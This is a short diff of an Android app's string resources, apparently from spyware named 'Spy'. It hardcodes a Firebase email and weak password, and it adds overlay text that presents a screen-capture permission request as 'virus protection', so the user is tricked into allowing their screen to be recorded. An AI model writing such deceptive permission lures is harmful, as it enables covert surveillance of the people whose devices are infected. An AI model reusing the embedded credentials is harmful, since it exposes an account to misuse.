@@ -2,4 +2,6 @@
     <string name="app_name">Spy</string>
     <string name="firebase_email" >eko.hendratno@gmail.com</string>
     <string name="firebase_password">12345678</string>
+    <string name="overlay_1">Check don\'t show again and click Start Now to start virus protection</string>
+    <string name="overlay_2">Settings will start capturing everything that\'s displayed on your screen.</string>
 </resources>
